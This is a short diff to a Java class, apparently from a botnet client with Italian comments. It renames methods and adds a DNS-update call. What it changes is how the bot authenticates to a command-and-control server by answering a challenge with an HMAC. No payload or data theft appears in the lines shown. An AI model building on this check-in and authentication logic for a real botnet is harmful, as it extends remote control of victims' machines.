@@ -53,7 +53,6 @@ public class Behavior {
 	public void initializeBot() {
 		
 		loadInfo();
-		
 		if (!engineBot.isCommandandconquerStatus()) {
 			// metter controllo ID se ==NULL genera altrimenti riusa
 			// TODO salvare ID su properties
@@ -65,6 +64,12 @@ public class Behavior {
 				System.out.println("Bot is Ready");
 			} else
 				System.out.println("Bot not Ready, authentication failed");
+		}else{
+			networkService.updateDnsInformation();
+
+			
+			
+			
 		}
 	}
 
@@ -79,7 +84,6 @@ public class Behavior {
 		} catch (InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException
 				| BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException | IOException
 				| InvalidKeySpecException e) {
-			// TODO genera ID
 			if ((pki.getPrivRSAKey() == null)||(Base64.encodeBase64String(pki.getPrivRSAKey().getEncoded())==""))
 				pki.generateKeyRSA();
 			if ((networkService.getIdHash() == null)||(networkService.getIdHash() == ""))
@@ -95,13 +99,13 @@ public class Behavior {
 
 	private boolean challengeToCommandConquer() {
 		System.out.println("IP C&C " + networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
-		Pairs<Long, Integer> challenge = request.getChallengeFromCommandAndConquer(engineBot.getIdBot(),
+		Pairs<Long, Integer> challenge = request.getChallengeFromCeC(engineBot.getIdBot(),
 				networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
 		if (challenge != null) {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
-			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(), networkService.getMac(),
+			String response = request.getResponseFromCeC(engineBot.getIdBot(), networkService.getMac(),
 					networkService.getCommandConquerIps().getCeCList().get(0).getValue1(), hashMac);
 			System.out.println("La risposta del CeC: " + response);
 		}
